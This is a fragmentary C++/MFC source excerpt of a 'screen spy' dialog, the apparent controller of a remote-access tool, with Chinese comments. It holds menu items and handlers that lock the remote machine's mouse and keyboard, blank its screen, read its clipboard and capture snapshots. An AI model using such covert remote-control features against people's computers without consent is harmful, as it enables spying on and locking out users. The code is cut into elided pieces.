...
enum
{
	...
	IDM_TRACE_CURSOR,	// 跟蹤顯示遠程鼠標
	IDM_BLOCK_INPUT,	// 鎖定遠程計算機輸入
	IDM_BLANK_SCREEN,	// 黑屏
	IDM_CAPTURE_LAYER,	// 捕捉層
	IDM_SAVEDIB,		// 保存圖片
	IDM_GET_CLIPBOARD,	// 獲取剪貼板
	IDM_SET_CLIPBOARD,	// 設置剪貼板
	IDM_ALGORITHM_SCAN,	// 隔行掃描算法
	IDM_ALGORITHM_DIFF,	// 差異比較算法
	IDM_DEEP_1,			// 屏幕色彩深度.....
	IDM_DEEP_4_GRAY,
	IDM_DEEP_4_COLOR,
	IDM_DEEP_8_GRAY,
...
#define ALGORITHM_DIFF	2	// 速度很慢，也占CPU，但是數據量都是最小的
	...
	: CDialog(CScreenSpyDlg::IDD, pParent)
{
	...
	m_pContext		= pContext;
	m_bIsFirst		= true; // 如果是第一次打開對話框，顯示提示等待信息
	m_lpScreenDIB	= NULL;
	char szPath[MAX_PATH];
	GetSystemDirectory(szPath, MAX_PATH);
	lstrcat(szPath, "\\shell32.dll");
	m_hIcon = ExtractIcon(AfxGetApp()->m_hInstance, szPath, 17/*網上鄰居圖標索引*/);
...
BOOL CScreenSpyDlg::OnInitDialog() 
{
	...
	if (pSysMenu != NULL)
	{
		...
		pSysMenu->AppendMenu(MF_STRING, IDM_SEND_CTRL_ALT_DEL, "發送Ctrl-Alt-Del(&K)");
		pSysMenu->AppendMenu(MF_STRING, IDM_TRACE_CURSOR, "跟蹤服務端鼠標(&T)");
		pSysMenu->AppendMenu(MF_STRING, IDM_BLOCK_INPUT, "鎖定服務端鼠標和鍵盤(&L)");
		pSysMenu->AppendMenu(MF_STRING, IDM_BLANK_SCREEN, "服務端黑屏(&B)");
		pSysMenu->AppendMenu(MF_STRING, IDM_CAPTURE_LAYER, "捕捉層(導致鼠標閃爍)(&L)");
		pSysMenu->AppendMenu(MF_STRING, IDM_SAVEDIB, "保存快照(&S)");
		pSysMenu->AppendMenu(MF_SEPARATOR);
		pSysMenu->AppendMenu(MF_STRING, IDM_GET_CLIPBOARD, "獲取剪貼板(&R)");
		pSysMenu->AppendMenu(MF_STRING, IDM_SET_CLIPBOARD, "設置剪貼板(&L)");
		pSysMenu->AppendMenu(MF_SEPARATOR);
		pSysMenu->AppendMenu(MF_STRING, IDM_ALGORITHM_SCAN, "隔行掃描算法(&S)");
		pSysMenu->AppendMenu(MF_STRING, IDM_ALGORITHM_DIFF, "差異比較算法(&X)");
		pSysMenu->AppendMenu(MF_SEPARATOR);
...
// {
// 	m_bIsFullScreen = !m_bIsFullScreen; // 設置全屏顯示標誌 
// 	//一種更好的全屏顯示
// 	LONG style = ::GetWindowLong(this->m_hWnd,GWL_STYLE);
// 	if(m_bIsFullScreen)//全屏顯示
// 	{
	...
	if (m_lpbmi != NULL)
	{
		...
		// 分辨率發生改變
 		if (nOldWidth != m_lpbmi->bmiHeader.biWidth || nOldHeight != m_lpbmi->bmiHeader.biHeight)
 		{
			...
			// 計算ClientRect與WindowRect的差距（標題欄，滾動條）
...
{
	// 根據鼠標是否移動和屏幕是否變化判斷是否重繪鼠標，防止鼠標閃爍
	bool	bIsReDraw = false;
	int		nHeadLength = 1 + 1 + sizeof(POINT) + sizeof(BYTE); // 標識 + 算法 + 光標位置 + 光標類型索引
...
CopyNextBlock:
		...
		lodsd	// 把lpNextScreen的第一個雙字節，放到eax中,就是DIB中改變區域的偏移
		add edi, eax	// lpFirstScreen偏移eax	
		lodsd // 把lpNextScreen的下一個雙字節，放到eax中, 就是改變區域的大小
		mov ecx, eax
		sub ebx, 8 // ebx 減去 兩個dword
		sub ebx, ecx // ebx 減去DIB數據的大小
		rep movsb
CopyEnd:
		cmp ebx, 0 // 是否寫入完畢
		jnz CopyNextBlock
...
{
	// 根據鼠標是否移動和鼠標是否在變化的區域判斷是否重繪鼠標，防止鼠標閃爍
	bool	bIsReDraw = false;
	int		nHeadLength = 1 + 1 + sizeof(POINT) + sizeof(BYTE); // 標識 + 算法 + 光標位置 + 光標類型索引
	LPVOID	lpFirstScreen = m_lpScreenDIB;
	LPVOID	lpNextScreen = m_pContext->m_DeCompressionBuffer.GetBuffer(nHeadLength);
...
void CScreenSpyDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	...
	case IDM_TRACE_CURSOR: // 跟蹤服務端鼠標
		...
		break;
	case IDM_BLOCK_INPUT: // 鎖定服務端鼠標和鍵盤
		{
	...
	case IDM_SAVEDIB:
		SaveSnapshot();
		break;
	case IDM_GET_CLIPBOARD: // 獲取剪貼板
		{
			BYTE	bToken = COMMAND_SCREEN_GET_CLIPBOARD;
			m_iocpServer->Send(m_pContext, &bToken, sizeof(bToken));
		}
		break;
	case IDM_SET_CLIPBOARD: // 設置剪貼板
		{
			SendLocalClipboard();
		}
		break;
	case IDM_ALGORITHM_SCAN: // 隔行掃描算法
		{
			SendResetAlgorithm(ALGORITHM_SCAN);
			pSysMenu->CheckMenuRadioItem(IDM_ALGORITHM_SCAN, IDM_ALGORITHM_DIFF, IDM_ALGORITHM_SCAN, MF_BYCOMMAND);
		}
		break;
	case IDM_ALGORITHM_DIFF: // 差異比較算法
		{
...
void CScreenSpyDlg::InitMMI()
{
	...
	int	nBorderWidth = rectClient.left - rectWindow.left; // 邊框寬
